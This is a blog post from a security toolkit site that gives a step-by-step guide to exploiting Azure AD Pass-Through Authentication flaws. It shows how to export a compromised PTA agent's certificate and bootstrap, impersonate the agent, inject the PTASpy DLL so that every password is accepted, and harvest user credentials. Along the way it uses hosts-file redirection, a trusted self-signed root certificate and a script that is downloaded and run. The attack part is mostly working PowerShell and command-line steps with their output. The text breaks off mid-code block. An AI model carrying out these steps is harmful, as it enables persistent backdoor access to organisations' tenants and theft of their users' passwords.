<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</title>
<meta name="description" content="The toolkit for Azure AD hackers, bounty hunters, red/blue teamers">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials" />
<meta property="og:description" content="In 13 September 2022, Secureworks published a Threat Analysis: Azure Active Directory Pass-Through Authentication Flaws.
The vulnerabilities discovered by our team allows threat actors to gain persistent and undetected access to the target Azure AD tenant.
In this blog post, I&rsquo;ll show how the attack can be conducted using AADInternals and standalone Windows server.
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://aadinternals.com/post/pta/" />



<meta property="article:published_time" content="2022-09-20T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2022-11-05T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-3XCVLYZKDW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-3XCVLYZKDW');
</script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="AADInternals.com" rel="home">
						<img src="/images/favicon-128.png" alt="Homepage"><h1 class="logo__title">AADInternals.com</h1>
						<h2 class="logo__tagline">The ultimate Entra ID (Azure AD) / Microsoft 365 hacking and admin toolkit</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">DOCUMENTATION</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/osint/">OSINT</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2022-09-20T00:00:00">September 20, 2022</time>
					<time class="post__meta-lastmod" datetime="2022-11-05T00:00:00"> (Last Modified: November 05, 2022)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=https%3a%2f%2faadinternals.com%2fpost%2fpta%2f&text=Exploiting%20Azure%20AD%20PTA%20vulnerabilities%3a%20Creating%20backdoor%20and%20harvesting%20credentials&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2faadinternals.com%2fpost%2fpta%2f&mini=true&title=Exploiting%20Azure%20AD%20PTA%20vulnerabilities%3a%20Creating%20backdoor%20and%20harvesting%20credentials&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/pta_00.png" alt="Exploiting Azure AD PTA vulnerabilities: Creating backdoor and harvesting credentials">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a>
<ul>
<li><a href="#disclaimer">Disclaimer</a></li>
<li><a href="#attack-scenario">Attack scenario</a></li>
<li><a href="#quick-start-guide">Quick start guide</a>
<ul>
<li><a href="#step-1">Step 1</a></li>
<li><a href="#step-2">Step 2</a></li>
</ul></li>
</ul></li>
<li><a href="#exporting-pta-agent-certificate-from-a-compromised-server">Exporting PTA agent certificate from a compromised server</a></li>
<li><a href="#exploiting-compromised-pta-agent-certificate">Exploiting compromised PTA agent certificate</a>
<ul>
<li><a href="#installing-pta-agent">Installing PTA Agent</a></li>
<li><a href="#using-existing-bootstrap">Using existing bootstrap</a></li>
<li><a href="#putting-it-all-together">Putting it all together</a>
<ul>
<li><a href="#configure-ptaspy-ps1">Configure-PTASpy.ps1</a></li>
<li><a href="#start-httpserver-ps1">Start-HttpServer.ps1</a></li>
<li><a href="#install-ptaspy-ps1">Install-PTASpy.ps1</a></li>
<li><a href="#dump-credentials-ps1">Dump-Credentials.ps1</a></li>
</ul></li>
</ul></li>
<li><a href="#detecting">Detecting</a>
<ul>
<li><a href="#monitoring-pta-agent-certificate-export">Monitoring PTA agent certificate export</a></li>
<li><a href="#monitoring-pta-agents">Monitoring PTA agents</a></li>
<li><a href="#monitoring-sign-in-discrepancies">Monitoring sign-in discrepancies</a></li>
</ul></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#credits-references">Credits &amp; References</a></li>
</ul>
</nav>
			<p>In 13 September 2022, <a href="https://www.secureworks.com/">Secureworks</a> published a Threat Analysis: <a href="https://www.secureworks.com/research/azure-active-directory-pass-through-authentication-flaws" target="_blank">Azure Active Directory Pass-Through Authentication Flaws</a>.
The vulnerabilities discovered by our team allows threat actors to gain persistent and undetected access to the target Azure AD tenant.<br><br>
In this blog post, I&rsquo;ll show how the attack can be conducted using <a href="/aadinternals" target="_blank">AADInternals</a> and standalone Windows server.
</p>

<h1 id="introduction">Introduction</h1>

<h2 id="disclaimer">Disclaimer</h2>

<p>I&rsquo;m not providing any new attack techniques in this blog. Everything has been covered in my earlier blogs and in Secureworks analysis.
Microsoft&rsquo;s response from the latter on Jul 7 2022:</p>

<blockquote>
<p>Our team completed the assessment for this issue and we understand that the attack surface for this requires compromising a high security asset by gaining administrative access in the first place.
If the customer followed our hardening guidance but the attacker still has access to the server that runs the PTA agent then they already had access to the user credentials,
hence <strong>we believe this vulnerability in itself does not pose an additional risk</strong>. As a mitigation mechanism, we do have the ability to block agents on the server side based on customer escalations and furthermore we are looking into ways to improve our audit logs as an improved detection mechanism.</p>
</blockquote>

<p>Secureworks will not share the custom PTA Agent mentioned in the threat analysis for the general public.
As such, for proof-of-concept purpose, I&rsquo;ll explain how to use a genuine Microsoft Azure AD Connect Authentication Agent (PTA agent) to exploit PTA vulnerabilities.</p>

<h2 id="attack-scenario">Attack scenario</h2>

<p>The attack scenario is quite simple and illustrated below. It is based on <a href="https://github.com/Gerenios/public/blob/master/PTASpy.cpp" target="_blank">PTASpy</a> I developed back in 2019 based on <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/" target="_blank">work</a> by Adam Chester (<a href="https://twitter.com/_xpn_" target="_blank">@&#95;xpn_</a>).</p>

<p><img src="/images/posts/pta_01.png" alt="attack in a glance" /></p>

<p>First, attacker compromises a server running the PTA agent and exports it&rsquo;s certificate.
Second, attacker uses the certificate with PTA agent under their control to impersonate the compromised PTA agent.</p>

<p>All the components required for the attack are included in <strong>AADInternals</strong>:</p>

<table>
<thead>
<tr>
<th>Function</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td><a href="/aadinternals/#export-aadintproxyagentcertificates" target="_blank">Export-AADIntProxyAgentCertificates</a></td>
<td>Export PTA agent certificate and bootstrap</td>
</tr>

<tr>
<td><a href="/aadinternals/#set-aadintptacertificate" target="_blank">Set-AADIntPTACertificate</a></td>
<td>Configure PTA agent to use the given certificate.</td>
</tr>

<tr>
<td><a href="/aadinternals/#install-aadintptaspy" target="_blank">Install-AADIntPTASpy</a></td>
<td>Inject <a href="https://github.com/Gerenios/public/blob/master/PTASpy.cpp" target="_blank">PTASpy.dll</a> to PTA agent. Enables backdoor and start harvesting credentials</td>
</tr>

<tr>
<td><a href="/aadinternals/#get-aadintptaspylog" target="_blank">Get-AADIntPTASpyLog</a></td>
<td>Show the harvested credentials.</td>
</tr>
</tbody>
</table>

<h2 id="quick-start-guide">Quick start guide</h2>

<p>For those who just wants to get started, here are the two steps. To learn more details, continue reading 😉</p>

<h3 id="step-1">Step 1</h3>

<p>On the server running PTA agent, as a local administrator, use AADInternals to export the certificate:
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export PTA agent certificate</span>
<span class="nb">Export-AADIntProxyAgentCertificates</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>WARNING: Running as LOCAL SYSTEM. You MUST restart PowerShell to restore PTA01\Administrator rights.
Certificate saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.pfx
</code></pre>

<p>On the server running PTA agent, <strong>on a new PowerShell session</strong>, use AADInternals to export the bootstrap:
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export PTA agent bootstrap</span>
<span class="nb">Export-AADIntProxyAgentBootstraps</span> <span class="n">-Certificates</span> <span class="n">PTA01</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com_ea664074</span><span class="p">-</span><span class="n">37dd</span><span class="p">-</span><span class="n">4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2</span><span class="p">-</span><span class="n">4357</span><span class="p">-</span><span class="n">814c</span><span class="p">-</span><span class="n">09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>Bootstrap saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.xml
</code></pre>

<p><strong>Note:</strong> If you get multiple certificates, bootstrap requests will fail for expired ones.
If this happens, use the certificate which bootstrap request doesn&rsquo;t fail.</p>

<p>Copy the certificate and bootstrap to an empty &ldquo;<strong>attack</strong>&rdquo; Windows server (tested on 2019 and 2022) and rename to <strong>cert.pfx</strong> and <strong>bootstrap.xml</strong>.</p>

<h3 id="step-2">Step 2</h3>

<p>Download the <a href="https://github.com/Gerenios/public/blob/master/PTASpy/Configure-PTASpy.ps1" target="_blank">Configure-PTASpy.ps1</a> to the &ldquo;<strong>attack</strong>&rdquo; server and run it as local administrator:</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Download the configuration script</span>
<span class="nb">wget </span><span class="s2">&quot;https://raw.githubusercontent.com/Gerenios/public/master/PTASpy/Configure-PTASpy.ps1&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;Configure-PTASpy.ps1&quot;</span>

<span class="c"># Configure PTASpy to use provided certificate and boostrap</span>
<span class="p">.\</span><span class="n">Configure-PTASpy</span> <span class="n">-Certificate</span> <span class="p">.\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-Bootstrap</span> <span class="p">.\</span><span class="n">bootstrap</span><span class="p">.</span><span class="n">xml</span> <span class="n">-Verbose</span>
</code></pre></div>


<p><strong>Note:</strong> Sometimes some downloads may fail. If that happens, you may need to manually rollback (i.e., uninstall Microsoft Azure AD Connect Authentication Agent) and try again.</p>

<p>And that&rsquo;s it! Now you have a server running a PTA agent with PTASpy installed. All passwords are now accepted and all
credentials are logged to <strong>C:\PTASpy\PTASpy.csv</strong></p>

<h1 id="exporting-pta-agent-certificate-from-a-compromised-server">Exporting PTA agent certificate from a compromised server</h1>

<p>The first step is to export the certificate of compromised server running PTA agent. This requires <strong>Local Administrator</strong> rights.</p>

<p>When you first configure PTA agent, the certificate is stored to <strong>Local Computer\Personal</strong> store.
As we learned from my earlier <a href="/post/deviceidentity/#decrypting-private-keys" target="_blank">blog post</a>, exporting certificates with private keys from there is easy.</p>

<p><img src="/images/posts/pta_02.png" alt="certificate" /></p>

<p>However, when the certificate is renewed by the PTA agent, it is stored to <strong>Personal</strong> store of the <strong>PTA service account</strong>.
The full path is:</p>

<pre><code>C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\&lt;thumbprint&gt;
</code></pre>

<p>AFAIK, you can only access the personal store of a <strong>current user</strong> or <strong>local machine</strong> with Windows binaries. As such, the challenge now was to get access to the certificate, not the private keys.</p>

<p>So, I had to implement a function that can <a href="https://github.com/Gerenios/AADInternals/blob/master/CommonUtils.ps1#L2222" target="_blank">parse</a> certificate blobs.</p>

<p>The location of the certificate is stored in the PTA agent&rsquo;s configuration file. The full path to configuration file is:</p>

<pre><code>C:\ProgramData\Microsoft\Azure AD Connect Authentication Agent\Config\TrustSettings.xml
</code></pre>

<p>The <strong>IsInUserStore</strong> indicates whether the certificate is stored to service account personal store or not.</p>

<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="nt">&lt;ConnectorTrustSettingsFile</span><span class="w"> </span><span class="na">xmlns:xsd=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema&quot;</span><span class="w"> </span><span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><span class="nt">&gt;</span>
<span class="w">  </span><span class="nt">&lt;CloudProxyTrust&gt;</span>
<span class="w">    </span><span class="nt">&lt;Thumbprint&gt;</span>07E929D419E244AC63310B97E95F7314595E68CA<span class="nt">&lt;/Thumbprint&gt;</span>
<span class="w">    </span><span class="nt">&lt;IsInUserStore&gt;</span>false<span class="nt">&lt;/IsInUserStore&gt;</span>
<span class="w">  </span><span class="nt">&lt;/CloudProxyTrust&gt;</span>
<span class="nt">&lt;/ConnectorTrustSettingsFile&gt;</span>
</code></pre></div>


<p>With this knowledge I was able to implement export <a href="https://github.com/Gerenios/AADInternals/blob/master/MSAppProxy.ps1#L537" target="_blank">function</a> that can export the certificate with private key from both stores.</p>

<p><strong>Note:</strong> The function will export certificates of all MS Proxy Agents (PTA and AAD Cloud Connect) installed on the computer.</p>

<p>As mentioned in the Threat Analysis, during a PTA agent start up, it fetches a configuration file from Azure AD called a <strong>bootstrap</strong>.
Fetching the configuration file populates the IP address of the PTA agent seen in the Azure AD portal.
This means that using the compromised certificate will change the IP address and reveals threat actor.
However, if we can provide an existing bootstrap, the IP address never changes:</p>

<blockquote>
<p>CTU researchers observed that the PTA agent’s IP address changed in the Azure AD portal when the custom PTA agent started (see Figure 17).
However, after the original PTA agent fetched the bootstrap during its next ten-minute cycle, the IP address reverted.
This behavior implies that the IP address is populated every time a PTA agent fetches the bootstrap.
When CTU researchers pointed the custom PTA agent to an existing bootstrap file on the system, the agent’s IP address did not change on the portal.
This result suggests that connecting directly to signaling listener endpoints does not affect the IP address.
<strong>As such, threat actors can use an existing bootstrap to connect to Azure AD undetected</strong>.</p>
</blockquote>

<p>For this purpose, I created a new function, <strong>Export-AADIntProxyAgentBootstraps</strong>. It uses the PTA certificate to fetch the bootstrap.</p>

<p><strong>To export the certificate:</strong></p>

<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export PTA agent certificate</span>
<span class="nb">Export-AADIntProxyAgentCertificates</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>WARNING: Running as LOCAL SYSTEM. You MUST restart PowerShell to restore PTA01\Administrator rights.
Certificate saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.pfx
</code></pre>

<p>As exporting the certificate elevates the PowerShell session to LOCAL SYSTEM, you need to export the bootstrap in a new PowerShell session (no admin rights needed).</p>

<p><strong>Note:</strong> You can export the bootstrap on any computer, as long as you have the certificate. However, exporting bootstrap using the PTA server doesn&rsquo;t change the ip address of the agent 😉</p>

<p><strong>To export the bootstrap:</strong>
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Export PTA agent bootstrap</span>
<span class="nb">Export-AADIntProxyAgentBootstraps</span> <span class="n">-Certificates</span> <span class="n">PTA01</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com_ea664074</span><span class="p">-</span><span class="n">37dd</span><span class="p">-</span><span class="n">4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2</span><span class="p">-</span><span class="n">4357</span><span class="p">-</span><span class="n">814c</span><span class="p">-</span><span class="n">09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52</span><span class="p">.</span><span class="n">pfx</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>Bootstrap saved to: PTA01.company.com_ea664074-37dd-4797-a676-b0cf6fdafcd4_4b6ffe82-bfe2-4357-814c-09da95399da7_A3457AEAE25D4C513BCF37CB138628772BE1B52.xml
</code></pre>

<p>The exported files are named as:</p>

<pre><code>&lt;server fqdn&gt;_&lt;tenant id&gt;_&lt;agent id&gt;_&lt;thumbprint&gt;.&lt;ext&gt;
</code></pre>

<p>For the next steps, I suggest renaming them to <strong>cert.pfx</strong> and <strong>bootstrap.xml</strong>.</p>

<h1 id="exploiting-compromised-pta-agent-certificate">Exploiting compromised PTA agent certificate</h1>

<p>Now that we have the certificate and the boostrap of the compromised PTA agent, we are ready to exploit it!</p>

<p>As mentioned earlier, all components for the attack are included in AADInternals.
However, I wanted to create a fully automated exploit without a need for AADInternals.</p>

<p>There were two challenges I had to overcome to get everything to work.</p>

<h2 id="installing-pta-agent">Installing PTA Agent</h2>

<p>First challenge was to install the official Microsoft PTA Agent without a need to run the configuration wizard.</p>

<p>During the normal installation, you need to provide Global Administrator credentials to register a new PTA agent.
As we want to use the certificate of already registered PTA agent, we do not need this step.</p>

<p>As we can see below, when the sign in is required, the PTA agent binaries are already installed on the system. However, clicking cancel, will unistall the binaries ☹</p>

<p><img src="/images/posts/pta_03.png" alt="Installing PTA Agent" /></p>

<p>It turned out that the <strong>AADConnectAuthAgentSetup.exe</strong> is <a href="https://wixtoolset.org/documentation/" target="_blank">WiX</a> package.
As such, it could be extracted with WiX tools:</p>

<pre><code>.\wix\dark.exe AADConnectAuthAgentSetup.exe -x AADConnectAuthAgentSetup
</code></pre>

<p><img src="/images/posts/pta_04.png" alt="extracted PTA Agent installer" /></p>

<p>Now I was able to install the PTA agent without running the configuration wizard:</p>

<pre><code>msiexec /package PassThroughAuthenticationInstaller.msi /passive
</code></pre>

<h2 id="using-existing-bootstrap">Using existing bootstrap</h2>

<p>Second challenge was how to provide the existing boostrap to PTA agent.
The PTA agent will fetch the boostrap during the startup and then every 10 minutes from:</p>

<pre><code>https://&lt;tenantid&gt;.pta.bootstrap.his.msappproxy.net/ConnectorBootstrap
</code></pre>

<p>First, I tried to configure IIS to do this. It worked great for the GET request, but not for POST.
Handling POST requests would have required me to create a handler.</p>

<p>Instead of that, I decided to create a simple and stupid http server using <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener" target="_blank">System.Net.HttpListener</a> to send the given file to any request it receives.</p>

<p>This required three extra steps:</p>

<ul>
<li>creating a self-signed SSL certificate and make Windows to trust it</li>
<li>add FQDN to .hosts file and point it to 127.0.0.1</li>
<li>configuring Windows to use the SSL certificate</li>
</ul>

<p>The first two steps was easy to do with PowerShell:
<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Generate certificate</span>
<span class="nv">$sslCert</span> <span class="p">=</span> <span class="nb">New-SelfSignedCertificate</span> <span class="n">-Subject</span> <span class="s2">&quot;CN=</span><span class="p">$(</span><span class="nv">$TenantId</span><span class="p">)</span><span class="s2">.pta.bootstrap.his.msappproxy.net&quot;</span> <span class="n">-DnsName</span> <span class="s2">&quot;</span><span class="p">$(</span><span class="nv">$TenantId</span><span class="p">)</span><span class="s2">.pta.bootstrap.his.msappproxy.net&quot;</span> <span class="n">-HashAlgorithm</span> <span class="s1">&#39;SHA256&#39;</span> <span class="n">-Provider</span> <span class="s2">&quot;Microsoft Strong Cryptographic Provider&quot;</span> <span class="n">-NotAfter</span> <span class="p">(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">AddYears</span><span class="p">(</span><span class="n">10</span><span class="p">)</span>

<span class="c"># Add certificate to trusted root certificate authorities</span>
<span class="nb">Write-Verbose</span> <span class="s2">&quot;* Add the SSL certificate (</span><span class="p">$(</span><span class="nv">$sslCert</span><span class="p">.</span><span class="n">Thumbprint</span><span class="p">)</span><span class="s2">) to Trusted Root Certificate Authorities&quot;</span>
<span class="nv">$rootStore</span> <span class="p">=</span> <span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s2">&quot;Cert:\LocalMachine\Root&quot;</span>
<span class="nv">$rootStore</span><span class="p">.</span><span class="n">Open</span><span class="p">(</span><span class="no">[System.Security.Cryptography.X509Certificates.OpenFlags]</span><span class="p">::</span><span class="n">ReadWrite</span><span class="p">)</span>
<span class="nv">$rootStore</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="nv">$sslCert</span><span class="p">)</span>
<span class="nv">$rootStore</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>

<span class="c"># Set the .hosts file</span>
<span class="nb">Write-Verbose</span> <span class="s2">&quot;* Add bootstrap FQDN (</span><span class="p">$(</span><span class="nv">$TenantId</span><span class="p">)</span><span class="s2">.pta.bootstrap.his.msappproxy.net) to .hosts file to point to 127.0.0.1&quot;</span>
<span class="nb">Add-Content</span> <span class="n">-Path</span> <span class="s2">&quot;</span><span class="p">$(</span><span class="nv">$env:windir</span><span class="p">)</span><span class="s2">\System32\drivers\etc\hosts&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;</span><span class="se">`n</span><span class="s2"># Bootstrap </span><span class="se">`n</span><span class="s2"> 127.0.0.1 </span><span class="se">`t</span><span class="s2"> </span><span class="p">$(</span><span class="nv">$TenantId</span><span class="p">)</span><span class="s2">.pta.bootstrap.his.msappproxy.net&quot;</span>
</code></pre></div>
</p>

<p>The third one needed a bit digging around, but I ended up to the following solution to first delete existing binding and then adding a new one using the thumbprint of SSL certificate created above:</p>

<pre><code>netsh.exe http delete sslcert ipport=0.0.0.0:443
netsh.exe http add sslcert ipport=0.0.0.0:443 certhash=&lt;thumbprint&gt; appid={00000000-0000-0000-0000-000000000000}
</code></pre>

<p>Now the PTA agent will get the existing bootstrap from the local server instead of Azure AD 🐱‍👤</p>

<h2 id="putting-it-all-together">Putting it all together</h2>

<p>I created the following scripts to configure and run <strong>PTASpy</strong>:</p>

<table>
<thead>
<tr>
<th>Script</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td><a href="https://github.com/Gerenios/public/blob/master/PTASpy/Configure-PTASpy.ps1" target="_blank">Configure-PTASpy.ps1</a></td>
<td>Downloads other scripts. <br>Downloads and installs PTA agent. <br> Downloads <a href="https://github.com/Gerenios/public/blob/master/PTASpy.cpp" target=_blank">PTASpy.dll</a> and <a href="https://github.com/Gerenios/public/blob/master/InjectDLL.cpp" target=_blank">InjectDLL.exe</a> <br> Configures PTA agent to use provided certificate.<br> Creates and trusts SSL certificate for http server. <br> Configures .hosts for providing boostrap from local http server.</td>
</tr>

<tr>
<td><a href="https://github.com/Gerenios/public/blob/master/PTASpy/Start-HttpServer.ps1" target="_blank">Start-HttpServer.ps1</a></td>
<td>Runs a local http server using the provided certificate and bootstrap.</td>
</tr>

<tr>
<td><a href="https://github.com/Gerenios/public/blob/master/PTASpy/Install-PTASpy.ps1" target="_blank">Install-PTASpy.ps1</a></td>
<td>(Re)starts PTA agent service and injects PTASpy.dll to it.</td>
</tr>

<tr>
<td><a href="https://github.com/Gerenios/public/blob/master/PTASpy/Dump-Credentials.ps1" target="_blank">Dump-Credentials.ps1</a></td>
<td>Dumps harvested credentials every 5 seconds.</td>
</tr>
</tbody>
</table>

<p>Download the <a href="https://github.com/Gerenios/public/blob/master/PTASpy/Configure-PTASpy.ps1" target="_blank">Configure-PTASpy.ps1</a> and place it with certificate and bootstrap on a fresh Windows server (tested on 2019 Azure VM and 2022 local VM).</p>

<h3 id="configure-ptaspy-ps1">Configure-PTASpy.ps1</h3>

<p>This script will do all the heavy lifting:</p>

<ul>
<li>Download other needed scripts</li>
<li>Download and install Microsoft Visual C++ 2015 Redistributable (x64)</li>
<li>Download PTA Agent setup (AADConnectAuthAgentSetup.exe)</li>
<li>Download WiX toolset</li>
<li>Extract and install PTA Agent (PassThroughAuthenticationInstaller.msi)</li>
<li>Configure tenant id, and agent id, and service host to registry</li>
<li>Create a configuration file to use the provided certificate</li>
<li>Import certificate to Local Computer Personal Store</li>
<li>Give the PTA service account (NT SERVICE\AzureADConnectAuthenticationAgent) read-only rights to private key</li>
<li>Enable PTA agent service set start up type to manual</li>
<li>Create folder C:\PTASpy</li>
<li>Download PTASpy.dll and InjectDLL.exe to C:\PTASpy</li>
<li>Clean installation files and downloads</li>
<li>Generate SSL certificate for local http server</li>
<li>Adds SSL certificate to Trusted Root CAs</li>
<li>Starts http server with provided boostrap</li>
<li>Starts PTA agent and installs PTA Spy</li>
<li>Starts credential dumping</li>
</ul>

<p><strong>To configure PTASpy and the start service:</strong></p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Configure PTASpy to use provided certificate and boostrap and start service </span>
<span class="p">.\</span><span class="n">Configure-PTASpy</span> <span class="n">-Certificate</span> <span class="p">.\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-Bootstrap</span> <span class="p">.\</span><span class="n">bootstrap</span><span class="p">.</span><span class="n">xml</span> <span class="n">-Verbose</span>
</code></pre></div>


<p>The configuration will take a couple of minutes, depending on you network connection and the target computer.</p>

<p>After the configuration is completed, you should have three windows open (click to enlarge):</p>

<p><a href="/images/posts/pta_05.png" target="_blank">
<img src="/images/posts/pta_05.png" alt="after configuration" />
</a></p>

<p>In the screenshot above, in top-right corner is running <strong>Dump-Credentials.ps1</strong> and bottom-right <strong>Start-HttpServer.ps1</strong>.
The former will show the harvested credentials extracted by PTASpy and the latter one all boostrap requests made by the PTA agent.</p>

<h3 id="start-httpserver-ps1">Start-HttpServer.ps1</h3>

<p><strong>To manually start the http server, you need the thumbprint of the certificate</strong>:</p>

<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List the certificates</span>
<span class="nb">Get-ChildItem</span> <span class="n">Cert</span><span class="p">:\</span><span class="n">LocalMachine</span><span class="p">\</span><span class="n">My</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">Subject</span> <span class="o">-Like</span> <span class="p">*</span><span class="n">msappproxy</span><span class="p">.</span><span class="n">net</span>
</code></pre></div>

<strong>Output:</strong></p>

<pre><code>Thumbprint                                Subject
----------                                -------
78D2B492C672D904CF2B5579659AC397E6D65F38  CN=95265eb2-xxxx-4xxx-xxxx-xxxxxxxxxxxx.pta.bootstrap.his.msappproxy.net
</code></pre>

<p><strong>To start the http server:</strong></p>

<p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Start the http server</span>
